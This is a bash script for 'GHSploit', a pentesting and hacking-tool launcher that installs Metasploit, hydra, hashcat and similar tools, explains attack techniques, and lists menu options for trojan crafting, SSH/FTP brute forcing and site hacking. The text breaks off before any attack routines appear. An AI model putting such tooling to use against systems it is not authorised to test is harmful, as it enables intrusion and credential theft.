#!/bin/bash

#=======================================
#Colors
#=======================================
grey="\037[0;32m"
greent="\033[0;32m"
greenf="\033[1;32m"
BlueF='\e[1;34m'
end="\033[0m"
orange='\e[38;5;166m'
cyan='\e[0;36m'
blues='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
slimred='\e[0;31m'
yellow='\e[0;33m'
mainc=$cyan
#=======================================
#Gently OS and arch detection
arch=$(uname -m) #Detecting arch of your system
os=$(lsb_release -i | awk {'print $3'}) #Detecting your OS
osver=$(lsb_release -r | awk {'print $2'}) #Detecting version of your os
krnlver=$(uname -v | awk {'print $4'}) #Kernel version detection
cpu=$(lscpu | grep "Model name" | awk {'print $3" "$4" "$5" "$6$7$8'}) #Detecting CPU model, Frequency
gpu=$(lspci | grep '3D') #Detecting GPU (3D ONLY)
ram=$(free -m | awk '/^Mem:/{print $2}') #How many RAM you have 
bashver=$(bash --version | awk '/^GNU bash/' | awk {'print $4'}) #Your bash version

sysinfo() {
	clear
	banner
	sleep 0.01
	echo "==========| System information |=========="
	sleep 0.01
	echo -e "${greent}Operation System${end} : ${yellow}$os"
	sleep 0.01
	echo -e "${greent}OS version${end} : ${yellow}$osver"
	sleep 0.01
	echo -e "${greent}Kernel version${end} : ${yellow}$krnlver"
	sleep 0.01
	echo -e "${greent}CPU${end} : ${yellow}$cpu"
	sleep 0.01
	echo -e "${greent}GPU(3D)${end} : ${yellow}$gpu"
	sleep 0.01
	echo -e "${greent}RAM(MB)${end} : ${yellow}$ram"
	sleep 0.01
	echo -e "${greent}Bash version${end} :${yellow}$bashver${end}"
	sleep 0.01
	echo ""
	echo -e "${greenf}Press [ENTER] to return to main menu${end}"
	read pasjdjasid
	main_menu
}
#=======================================
#Check internet function
#=======================================
checkinternet() {
	echo -e "$greenf" "[ * ] Checking for internet connection..."
	sleep 1
	echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1 #sending GET request to google.com
	if [ $? -ne 0 ];then
		echo -e "$red[ X ] : [Internet Connection]: [OFFLINE]"
		echo -e "$red" "[X] Your Internet is not working correctly!"
		sleep 1
		echo -e "$cyan" "[*] Checking ...."
		#ping hostname failed , so now will test ping google ip dns server
		ping -c 1 8.8.4.4 > /dev/null 2>&1
		png="$?" 
		if [ "$png" == "0" ];then
			internet="[${yellow}Connected, but there may be errors${end}]"
			connection=5050
		    echo -e "$red" "[X] Your system can't resolve"
		    echo -e "$red" "hostnames over terminal using ping."
		    echo ""
		    echo -e "$yellow" "Search on the web : unable to resolve hostnames ping to find a solution"
			echo ""
			echo -e "$greenf" "Setup will continue , but is not garantee that apt package management
			may work properly , or even if it can resolve hostnames ."
			echo ""
			echo -e "$cyan" "Setup will continue because :"
			echo -e "$greenf" "Ping google.com =$red Failed"
			echo -e "$greenf" "Ping google DNS = Success"
			echo ""
			echo -e "$greenf" "Press [ENTER] key to continue"
			read continue
		elif [ "$png" == "1" ];then
			internet="[${orange}Connected to LAN${end}]"
			connection=lan
			echo -e "$yellow" "You are connected to your local network but not to the web."
			echo -e "$yellow" "Check if your router/modem gateway is connected to the web."
			echo ""
			echo -e "$greenf" "Setup will continue, but you will only be able to run tests on the local network"
			echo -e "$greenf" "Right now, GHSploit's functionality is limited"
			echo ""
			echo -e "$greenf" "Ping google.com =$red Failed"
			echo -e "$greenf" "Ping google DNS =$red Failed"
			echo ""
			echo -e "$greenf" "Press [ENTER] key to continue"
			read -r continue
		elif [ "$png" == "2" ];then
			internet="[${red}Not connected to any network${end}]"
			connection=no
			echo -e "$red" "You are not connected to any network ."
			echo ""
			echo -e "$cyan" "Setup will continue, but you can perform only offline tasks!"
			echo -e "$greenf" "Ping google.com =$red Failed"
			echo -e "$greenf" "Ping google DNS =$red Failed"
			echo ""
			echo -e "$greenf" "Press [ENTER] key to continue"
			read -r continue
		fi
	else
		internet="[${BlueF}Connected to internet${end}]"
		connection=yes
		echo -e "$greenf [ ✔ ] : [Internet Connection]: CONNECTED!"
		echo ""
		echo -e "$greenf Press [ENTER] key to continue${end}"
		read continue
	fi
}

#In main menu, you can re-check your connection by clicking one button, no GHSPloit restarting requied 
conrecheck() {
	clear
	banner
	checkinternet
}
#=======================================
#BEGIN OF PRE-START FUNCTIONS
#=======================================
#Pre-start function that form the pre-start functions sequence (check root, check for tools installed etc) 
prestart() {
	clear
	check_root
	checkinternet
	checkmark=0
	onetimeupdate
	ask_for_requiements
	clear
	sleep 0.5
	msfcheck
	sleep 0.5
	sqlmapcheck
	sleep 0.5
	nmapcheck
	sleep 0.5
	whoischeck
	sleep 0.5
	hydracheck
	sleep 0.5
	hashcatcheck
	sleep 0.5
	niktocheck
	sleep 0.5
	wpscancheck
	sleep 0.5
	joomscancheck
	sleep 0.5
	dirbcheck
	sleep 0.5
	gobustercheck
	installcheck
	main_menu
}

nonroot() {
	root="${red}Non-root"
	clear
	checkinternet
	insreq=0
	msfcheck > /dev/null 2>&1
	sqlmapcheck > /dev/null 2>&1
	nmapcheck > /dev/null 2>&1
	whoischeck > /dev/null 2>&1
	hydracheck > /dev/null 2>&1
	hashcatcheck > /dev/null 2>&1
	niktocheck > /dev/null 2>&1
	wpscancheck > /dev/null 2>&1
	joomscancheck > /dev/null 2>&1
	dirbcheck > /dev/null 2>&1
	gobustercheck > /dev/null 2>&1
	main_menu
}

#For start, GHSploit need to be sure you are root
#Root needed for some types of attacks, for example, some nmap scan types requied root-privileges
#System updating, installing requied software needs root privs
#For general purposes and some limited usage, we made an non-root starting function, so you can run GHSPloit without root privileges
#But in this case, we can not guarantee 100% functionality of the program
check_root() {
	if (("$EUID" != 0));then
		echo -e "${slimred}I'm sorry, I need root to do things.."
		echo -e "Please, run GHSploit as superuser or try parameter --nonroot to try non-root version${end}"
		echo "Exiting..."
	    exit
	else
		root="${BlueF}Root"
	fi
}

#One time update && upgrade function (if user want it)
onetimeupdate() {
	echo -e "Can I update your system? (y/n)${red}"
	read -p $'\e[1;31m>>>\e[0m ' caniupdate
	case $caniupdate in
		y)
		xterm -geometry 100x30 -T "Updating your system" -e "sudo apt-get update && sudo apt-get dist-upgrade && sudo apt-get full-upgrade"
		echo "Done!"
		;;
		n)
		;;
		*)
		echo "Error input, repeating..."
		onetimeupdate
		;;
	esac
}

#Next, it will ask, do you want to auto install requiements
ask_for_requiements() {
	echo -e "${end}Can I automaticly install requiements? (y/n)${red}"
	read -p $'\e[1;31m>>>\e[0m ' afr_ans
	case $afr_ans in
		y)
		insreq=1
		;;
		n)
		insreq=0
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		ask_for_requiements
		;;
	esac
}

#=======================================
#Default force start without installing requiements
#=======================================
forcestart() {
	clear
	check_root
	checkinternet
	insreq=0
	msfcheck > /dev/null 2>&1
	sqlmapcheck > /dev/null 2>&1
	nmapcheck > /dev/null 2>&1
	whoischeck > /dev/null 2>&1
	hydracheck > /dev/null 2>&1
	hashcatcheck > /dev/null 2>&1
	niktocheck > /dev/null 2>&1
	wpscancheck > /dev/null 2>&1
	joomscancheck > /dev/null 2>&1
	dirbcheck > /dev/null 2>&1
	gobustercheck > /dev/null 2>&1
	main_menu
}
#=======================================
#Force start with installing requiements
#=======================================
forcestartinst() {
	clear
	check_root
	checkinternet
	insreq=1
	echo "Please wait until GHSploit will set up all the requirements it needs"
	msfcheck > /dev/null 2>&1
	sqlmapcheck > /dev/null 2>&1
	nmapcheck > /dev/null 2>&1
	whoischeck > /dev/null 2>&1
	hydracheck > /dev/null 2>&1
	hashcatcheck > /dev/null 2>&1
	niktocheck > /dev/null 2>&1
	wpscancheck > /dev/null 2>&1
	joomscancheck > /dev/null 2>&1
	dirbcheck > /dev/null 2>&1
	gobustercheck > /dev/null 2>&1
	main_menu
}
#Now is the requied software check time!
#Lets start with msfcheck
msfcheck() {
	which msfconsole > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e "${end}Metasploit......................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		msfinstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "Metasploit...........................[ ${orange}Not found${end} ]"
		echo -e "Installing msfconsole...."
		xterm -geometry 100x30 -T "Installing Metasploit" -e "sudo apt-get install metasploit-framework"
		which msfconsole > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed msfconsole${end}"
			checkmark=$((checkmark+1))
			msfinstalled=1
		else
			echo -e "${orange}Something went wrong while metasploit installation...Please, restart the program and try again!${end}"
			msfinstalled=0
		fi
	else
		echo -e "Metasploit......................[ ${red}Not found${end} ]"
		msfinstalled=0
	fi
}
#Checking if SQLMAP is exist..
sqlmapcheck() {
	which sqlmap > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "sqlmap..........................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		sqlmapinstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "sqlmap...........................[ ${orange}Not found${end} ]"
		echo -e "Installing sqlmap...."
		xterm -geometry 100x30 -T "Installing sqlmap" -e "sudo apt-get install sqlmap"
		which sqlmap > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed	sqlmap${end}"
			checkmark=$((checkmark+1))
			sqlmapinstalled=1
		else
			echo -e "${orange}Something went wrong while sqlmap installation...Please, restart the program and try again!${end}"
			sqlmapinstalled=0
		fi
	else
		echo -e "sqlmap..........................[ ${red}Not found${end} ]"
		sqlmapinstalled=0
	fi
}

#Checking if NMAP is exist..
nmapcheck() {
	which nmap > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "nmap............................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		nmapinstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "nmap...........................[ ${orange}Not found${end} ]"
		echo -e "Installing nmap...."
		xterm -geometry 100x30 -T "Installing nmap" -e "sudo apt-get install nmap nmap-common"
		which nmap > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed	nmap${end}"
			checkmark=$((checkmark+1))
			nmapinstalled=1
		else
			echo -e "${orange}Something went wrong while nmap installation...Please, restart the program and try again!${end}"
			nmapinstalled=0
		fi
	else
		echo -e "nmap............................[ ${red}Not found${end} ]"
		nmapinstalled=0
	fi
}

#Checking if WHOIS is exist..
whoischeck() {
	which whois > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "whois...........................[ ${greenf}Found${end} ]"
		whoisinstalled=1
		checkmark=$((checkmark+1))
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "whois...........................[ ${orange}Not found${end} ]"
		echo -e "Installing whois tools...."
		xterm -geometry 100x30 -T "Installing whois tools" -e "sudo apt-get install whois spiderfoot python3-whois"
		which whois > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed	whois${end}"
			checkmark=$((checkmark+1))
			whoisinstalled=1
		else
			echo -e "${orange}Something went wrong while whois installation...Please, restart the program and try again!${end}"
			whoisinstalled=0
		fi
	else
		echo -e "whois...........................[ ${red}Not found${end} ]"
		whoisinstalled=0
	fi
}

#Checking if HYDRA is exist..
hydracheck() {
	which hydra > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "hydra...........................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		hydrainstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "hydra...........................[ ${orange}Not found${end} ]"
		echo "Installing hydra..."
		xterm -geometry 100x30 -T "Installing THC-Hydra" -e "sudo apt-get install hydra"
		which hydra > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed hydra${end}"
			checkmark=$((checkmark+1))
			hydrainstalled=1
		else
			echo -e "${orange}Something went wrong while hydra installation...Please, restart the program and try again!${end}"
			hydrainstalled=0
		fi
	else
		echo -e "hydra...........................[ ${red}Not found${end} ]"
		hydrainstalled=0
	fi
}

#Checking if HASHCAT is exist..
hashcatcheck() {
	which hashcat > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "hashcat.........................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		hashcatinstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "hashcat.......................[ ${orange}Not found${end} ]"
		echo "Installing hashcat tools..."
		xterm -geometry 100x30 -T "Installing hashcat utils" -e "sudo apt-get install hashcat hashcat-data hashcat-nvidia hashcat-utils hashcat-utils hashcat-utils-dbgsym -y"
		which hashcat > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed hashcat${end}"
			checkmark=$((checkmark+1))
			hashcatinstalled=1
		else
			echo -e "${orange}Something went wrong while hashcat installation...Please, restart the program and try again!${end}"
			hashcatinstalled=0
		fi
	else
		echo -e "hashcat.......................[ ${red}Not found${end} ]"
		hashcatinstalled=0
	fi
}

#Checking if NIKTO is exist..
niktocheck() {
	which nikto > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "nikto...........................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		niktoinstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "nikto...........................[ ${orange}Not found${end} ]"
		echo "Installing nikto..."
		xterm -geometry 100x30 -T "Installing nikto" -e "sudo apt-get install nikto"
		which nikto > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed nikto${end}"
			checkmark=$((checkmark+1))
			niktoinstalled=1
		else
			echo -e "${orange}Something went wrong while nikto installation...Please, restart the program and try again!${end}"
			niktoinstalled=0
		fi
	else
		echo -e "nikto...........................[ ${red}Not found${end} ]"
		niktoinstalled=0
	fi
}

#Checking if WPSCAN is exist..
wpscancheck() {
	which wpscan > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "wpscan..........................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		wpscaninstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "wpscan..........................[ ${orange}Not found${end} ]"
		echo "Installing wpscan..."
		xterm -geometry 100x30 -T "Installing WordPress Scan" -e "sudo apt-get install wpscan"
		which wpscan > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed wpscan${end}"
			checkmark=$((checkmark+1))
			wpscaninstalled=1
		else
			echo -e "${orange}Something went wrong while wpscan installation...Please, restart the program and try again!${end}"
			wpscaninstalled=0
		fi
	else
		echo -e "wpscan..........................[ ${red}Not found${end} ]"
		wpscaninstalled=0
	fi
}

#Checking if JOOMSCAN is exist..
joomscancheck() {
	which joomscan > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "joomscan........................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		joomscaninstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "joomscan........................[ ${orange}Not found${end} ]"
		echo "Installing joomscan..."
		xterm -geometry 100x30 -T "Installing Joomla Scan" -e "sudo apt-get install joomscan"
		which joomscan > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed joomscan${end}"
			checkmark=$((checkmark+1))
			joomscaninstalled=1
		else
			echo -e "${orange}Something went wrong while joomscan installation...Please, restart the program and try again!${end}"
			wpscaninstalled=0
		fi
	else
		echo -e "joomscan........................[ ${red}Not found${end} ]"
		joomscaninstalled=0
	fi
}

#Checking if DIRB is exist..
dirbcheck() {
	which dirb > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "dirb............................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		dirbinstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "dirb............................[ ${orange}Not found${end} ]"
		echo "Installing dirb..."
		xterm -geometry 100x30 -T "Installing dirb" -e "sudo apt-get install dirb"
		which dirb > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed dirb${end}"
			checkmark=$((checkmark+1))
			dirbinstalled=1
		else
			echo -e "${orange}Something went wrong while dirb installation...Please, restart the program and try again!${end}"
			dirbinstalled=0
		fi
	else
		echo -e "dirb............................[ ${red}Not found${end} ]"
		dirbinstalled=0
	fi
}

#Checking if GOBUSTER is exist..
gobustercheck() {
	which gobuster > /dev/null 2>&1
	if [ "$?" -eq "0" ];then
		echo -e "gobuster........................[ ${greenf}Found${end} ]"
		checkmark=$((checkmark+1))
		gobusterinstalled=1
	elif [ "$?" -ne "0" ] && [ $insreq == 1 ];then
		echo -e "gobuster........................[ ${orange}Not found${end} ]"
		echo "Installing gobuster..."
		xterm -geometry 100x30 -T "Installing GoBuster" -e "sudo apt-get install gobuster"
		which gobuster > /dev/null 2>&1
		if [ "$?" -eq "0" ];then
			echo -e "${greenf}Succesfully installed gobuster${end}"
			checkmark=$((checkmark+1))
			gobusterinstalled=1
		else
			echo -e "${orange}Something went wrong while gobuster installation...Please, restart the program and try again!${end}"
			gobusterinstalled=0
		fi
	else
		echo -e "gobuster........................[ ${red}Not found${end} ]"
		gobusterinstalled=0
	fi
}

#Now we have to make sure that all the components are installed
installcheck() {
	if [ $checkmark -eq 11 ];then
		echo -e "${greenf}All of the requied components are installed!"
		echo "Press enter to continue"
		read qwe
	elif [ $checkmark -lt 11 ];then
		echo -e "One or more of the requied components are not installed."
		sleep 0.01
		echo "Are you sure you want to continue(y/n)?"
		sleep 0.01
		echo "It will cause limited functionality..."
		read -p $'\e[1;31m>>>\e[0m ' areyousure
		case $areyousure in
			y)
			main_menu
			;;
			n)
			exit
			;;
			*)
			echo "Error input, repeating..."
			sleep 1
			installcheck
			;;
		esac
	fi
}
#=======================================
#END OF PRE-START FUNCTIONS
#=======================================

#Banner
banner() {
	echo -e "${greenf}░██████╗░██╗░░██╗░██████╗██████╗░██╗░░░░░░█████╗░██╗████████╗"
	sleep 0.01
	echo -e "██╔════╝░██║░░██║██╔════╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝"
	sleep 0.01
	echo -e "██║░░██╗░███████║╚█████╗░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░"
	sleep 0.01
	echo -e "██║░░╚██╗██╔══██║░╚═══██╗██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░"
	sleep 0.01
	echo -e "╚██████╔╝██║░░██║██████╔╝██║░░░░░███████╗╚█████╔╝██║░░░██║░░░"
	sleep 0.01
	echo -e "░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░${end}"
	sleep 0.01
	echo -e "${greenf}=====================${end}${cyan}C0d3d_by_Gr3y_H4T${end}${greenf}=======================${end}"
}

#Main menu
main_menu() {
	clear
	banner
	sleep 0.01
	echo -e "$internet[$root${end}][${white}OS : ${end}${BlueF}$os${end}][${white}ARCH : ${end}${yellow}$arch${end}]"
	sleep 0.01
    echo -e "${greenf}=============================================================${end}"
	echo -e "${white}--------------------| What will you do? |--------------------${end}"
	echo -e "[1] Go to tools"
	sleep 0.01
	echo -e "[2] Read documentation and some FAQ"
	sleep 0.01
	echo -e "[3] Re-check internet"
	sleep 0.01
	echo -e "[4] System information[BETA]"
	sleep 0.01
	echo -e "[5] Feedback"
	sleep 0.01
	echo -e "[6] Exit${red}"
#	echo ""
	read -p $'\e[1;31m>>>\e[0m ' main_choose
	case $main_choose in
		1)
		tools
		;;
		2)
		documentation
		;;
		3)
		conrecheck
		main_menu
		;;
		4)
		sysinfo
		;;
		5)
		feedback
		;;
		6)
		exit 0
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		main_menu
		;;
	esac
}

feedback() {
	clear
	banner
	echo "If you have any issues/suggestions or any other questions, feel free to contact us anytime"
	sleep 0.01
	echo "Mail : greyhatfeedback@protonmail.com"
	sleep 0.01
	echo "Press 'Enter' to return to the main menu..."
	read mmm
	main_menu
}

#FAQ and documentation
documentation() {
	clear
	banner
	sleep 0.01
	echo "------------------------Documentation------------------------"
	sleep 0.01
	echo "[1] What is nmap(1st option)?"
	sleep 0.01
	echo "[2] What is SQL-injection (sqlmap, 2nd option)"
	sleep 0.01
	echo "[3] How is payload crafting works?"
	sleep 0.01
	echo "[4] What is WHOIS Tool?"
	sleep 0.01
	echo "[5] What is hydra and login form bruteforcing?"
	sleep 0.01
	echo "[6] What is hashcat and..handshake cracking?"
	sleep 0.01
	echo "[7] What is Wordpress and wpscan(7th option)?"
	sleep 0.01
	echo "[8] What is Joomla and joomscan(8th option)?"
	sleep 0.01
	echo "[9] What is directory enumerating?"
	sleep 0.01
	echo "What difference between quick and advanced directory enum?"
	sleep 0.01
	echo "[10] What is Wi-Fi handshake capturing?"
	sleep 0.01
	echo "--------------------End of documentation---------------------"
	sleep 0.01
	echo "[11] Go to FAQ"
	sleep 0.01
	echo -e "[00] Back to menu${red}"
	read -p $'\e[1;31m>>>\e[0m ' doc_input
	case $doc_input in
		1)
		echo "nmap(the network mapper) - is a powerfull, free and open-source tool to perform ports scanning"
		sleep 0.01
		echo "With nmap you can scan hosts for open ports and vulnerabilities"
		sleep 0.01
		echo "For more information, please, visit nmap.org"
		repeat_doc_input
		;;
		2)
		echo "SQL Injection(SQLi) - is the one of the most dangerous type of webapp vulnerabilities"
		sleep 0.01
		echo "SQLi is based on malicious SQL-querry to the victim database"
		sleep 0.01
		echo "Database is retrieving and execute that kind of query"
		sleep 0.01
		echo "So it causes an any kind of SQL-attacks"
		sleep 0.01
		echo "For example : Dumping database, broke the webapp logic, view hidden data etc"
		sleep 0.01
		echo "sqlmap - is a free and open-source tool to perform sql-based databases pentesting"
		sleep 0.01
		echo "With sqlmap you can find and exploit sql vulnerabilities"
		sleep 0.01
		echo "For more information, please, visit sqlmap.org"
		repeat_doc_input
		;;
		3)
		echo "To craft the payloads, GHSploit using the Metasploit Framework(msf)"
		sleep 0.01
		echo "msf - is the most popular tool to perform pentesting of ALL THINGS"
		sleep 0.01
		echo "You can scan and exploit literally anything with msf"
		sleep 0.01
		echo "For more information, please, visit metasploit.com"
		repeat_doc_input
		;;
		4)
		echo "WHOIS - is the little tool for gathering information about domain"
		sleep 0.01
		echo "Whois displays information about domain name, IP, domain owner etc"
		sleep 0.01
		echo "Original site : who.is"
		repeat_doc_input
		;;
		5)
		echo "Bruteforcing - is the type of cyberattack, when the attacker using special dictionaries"
		sleep 0.01
		echo "That consists of usernames/passwords"
		sleep 0.01
		echo "It works by the next scheme : program takes, for example, login:admin and interchangeably takes the passwords from the wordlist"
		sleep 0.01
		echo "And performs authorization"
		sleep 0.01
		echo "If the password has found from wordlist - program will stop and show password"
		sleep 0.01
		echo "Hydra - is the powerfull tool to perform online-services auth bruteforcing"
		sleep 0.01
		echo "Hydra can bruteforce all of the most popular web auth forms, for example, ssh, ftp, http-get, http-post etc"
		sleep 0.01
		echo "GHSploit uses Hydra to bruteforce FTP and SSH servers(yet)"
		sleep 0.01
		echo "Bruteforcing other services requires more user interaction with the terminal, which is rather problematic to automate"
		sleep 0.01
		echo "More information at : github.com/vanhauser-thc/thc-hydra"
		repeat_doc_input
		;;
		6)
		echo "Hashcat - is the really most powerfull open-source tool for cracking hashes(today)"
		sleep 0.01
		echo "Handshakes - is the 'hash', that have a key of Wi-Fi Network"
		sleep 0.01
		echo "Hashcat can bruteforce hashes by converting the words into hashes and comparing them to the access point hash"
		sleep 0.01
		echo "If the hashes match, the program stops and displays the word whose hash matched the network hash"
		sleep 0.01
		echo "More info at hashcat.net/hashcat/"
		repeat_doc_input
		;;
		7)
		echo "Wordpress is the popular CMS(Content Management System)"
		sleep 0.01
		echo "wpscan - is the penetration testing tool for Wordpress sites"
		sleep 0.01
		echo "wpscan performs WP plugins analizing, admin-panel finding and common exploits testing"
		sleep 0.01
		echo "For more information, please, visit wpscan.com"
		repeat_doc_input
		;;
		8)
		echo "Joomla - is the less popular CMS"
		sleep 0.01
		echo "joomscan doing the same things as wpscan, but for joomla-based sites"
		sleep 0.01
		echo "For more information, please, visit github.com/OWASP/joomscan"
		;;
		9)
		echo "Directory Enumeration - is the process, when attacker searching for files and directories of victim site by using special tools"
		sleep 0.01
		echo "For example, attacker can search for admin-panel, whitelist files, databases etc"
		sleep 0.01
		echo "If the site does not have a request filter for unauthorized users or important files (such as configuration files) are not hidden, an attacker can easily gain access to them"
		sleep 0.01
		echo "Quick directory enumerating performed by dirb tool, which just quickly enums directories by default wordlist"
		sleep 0.01
		echo "Gobuster, beyond a simple directory enum, can search for specified files, pages, you can set number of threads for more performance and so more!"
		repeat_doc_input
		;;
		10)
		echo "When the user connecting to Wi-Fi point, user device and Wi-Fi router exchanging special handshakes, which contain encrypted password from the network."
		sleep 0.01
		echo "Capturing Wi-Fi Handshakes - the process, when the attacker 'capture' the authorization packet, which have the password from the Wi-Fi point"
		sleep 0.01
		echo "After handshake was captured, it can be cracked by Hashcat"
		repeat_doc_input
		;;
		11)
		faq
		;;
		00)
		main_menu
		;;
	esac
}

repeat_doc_input() {
	echo -e "Still you have any questions?(y/n): ${red}"
	read -p $'\e[1;31m>>>\e[0m ' repeat_doc_ans
	case $repeat_doc_ans in 
		y)
		documentation
		;;
		n)
		main_menu
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		repeat_doc_input
		;;
	esac
}

repeat_faq_input() {
	echo -e "Still you have any questions?(y/n): ${red}"
	read -p $'\e[1;31m>>>\e[0m ' repeat_faq_ans
	case $repeat_faq_ans in 
		y)
		faq
		;;
		n)
		main_menu
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		repeat_faq_input
		;;
	esac
}

faq() {
	clear
	banner
	sleep 0.01
	echo "-----------------Frequently Asked Questions-----------------"
	sleep 0.01
	echo "[1] What is GHSploit?"
	sleep 0.01
	echo "[2] How to use it?"
	sleep 0.01
	echo "[3] Can I call myself a hacker by using it? ;D"
	sleep 0.01
	echo "[4] Is it free?"
	sleep 0.01
	echo "[5] Can I trust it?"
	sleep 0.01
	echo "--------------End of Frequently Asked Questions--------------"
	sleep 0.01
	echo "[6] Back to documentation"
	sleep 0.01
	echo "[7] Back to menu"
	read -p $'\e[1;31m>>>\e[0m ' faq_input
	case $faq_input in
		1)
		echo "GHSploit - is the massive multiexploitation and pentesting script"
		sleep 0.01
		echo "GHSploit contain the most popular tools to perform pentesting and exploitation"
		sleep 0.01
		echo "GHSploit was made to simplify penetration testing and post exploitation"
		repeat_faq_input
		;;
		2)
		echo "It is extremely simple to do things with GHSploit"
		sleep 0.01
		echo "Answer the questions that script asks and enjoy :)"
		repeat_faq_input
		;;
		3)
		echo "Hacking is the great art"
		sleep 0.01
		echo "GHSploit will not make you a hacker, but it can help you understand many of the fundamental things that will help you on your path to becoming a hacker"
		sleep 0.01
		echo "You can explore the source code of GHSploit, learn how that things works, how programs interacts with usable tools etc"
		sleep 0.01
		echo "But remember - with great power comes great responsibility. Be strength."
		repeat_faq_input
		;;
		4)
		echo "Yes. Tool is absolutely free and open-source."
		sleep 0.01
		echo "Distributed on GNU GPL, you can modify, share and do what you want with it"
		sleep 0.01
		echo "In the case of modification and distribution, the contact information of the developer must remain"
		repeat_faq_input
		;;
		5)
		echo "You can trust the script unquestioningly, because of the open source code, you can make sure that there are no tracking or malicious components."
		sleep 0.01
		echo "However, the script uses third-party applications, to trust or not trust them is your decision"
		repeat_faq_input
		;;
		6)
		documentation
		;;
		7)
		main_menu
		;;
	esac
}

#Tools
tools() {
	clear
	banner
	echo "===================( Select tool to use )===================="
	sleep 0.01
	if [ $nmapinstalled -eq 1 ];then
		echo "[1] Scan IP/Domains for open ports/vulners(TCP only)"
	elif [ $nmapinstalled -eq 0 ];then
		echo -e "${red}[1] Scan IP/Domains for open ports/vulners(TCP only)${end}"
	fi
	sleep 0.01
	if [ $sqlmapinstalled -eq 1 ];then
		echo "[2] SQL Injection scan"
	elif [ $sqlmapinstalled -eq 0 ];then
		echo -e "${red}[2] SQL Injection scan${end}"
	fi
	sleep 0.01
	if [ $msfinstalled -eq 1 ];then
		echo "[3] Trojan/backdoor crafting(android or windows,reverse_tcp)"
	elif [ $msfinstalled -eq 0 ];then
		echo -e "${red}[3] Trojan/backdoor crafting(android or windows,reverse_tcp)${end}"
	fi
	sleep 0.01
	if [ $whoisinstalled -eq 0 ];then
		echo -e "${red}[4] WHOIS Tool${end}"
	elif [ $whoisinstalled -eq 1 ];then
		echo "[4] WHOIS Tool"
	fi
	sleep 0.01
	if [ $hydrainstalled -eq 1 ];then
		echo "[5] Hack the FTP/SSH server"
	elif [ $hydrainstalled -eq 0 ];then
		echo -e "${red}[5] Hack the FTP/SSH server${end}"
	fi
	sleep 0.01
	if [ $hashcatinstalled -eq 1 ];then
		echo "[6] Crack the wi-fi password(handshake brute)"
	elif [ $hashcatinstalled -eq 0 ];then
		echo -e "${red}[6] Crack the wi-fi password(handshake brute)${end}"
	fi
	sleep 0.01
	if [ $wpscaninstalled -eq 1 ];then
		echo "[7] Hack the WordPress site"
	elif [ $wpscaninstalled -eq 0 ];then
		echo -e "${red}[7] Hack the WordPress site${end}"
	fi
	sleep 0.01
	if [ $joomscaninstalled -eq 1 ];then
		echo "[8] Hack the Joomla site"
	elif [ $joomscaninstalled -eq 0 ];then
		echo -e "${red}[8] Hack the Joomla site${end}"
	fi
	sleep 0.01
	if [ $niktoinstalled -eq 1 ];then
		echo "[9] Nikto vulnerability scanner"
	elif [ $niktoinstalled -eq 0 ];then
		echo -e "${red}[9] Nikto vulnerability scanner${end}"
	fi
	sleep 0.01
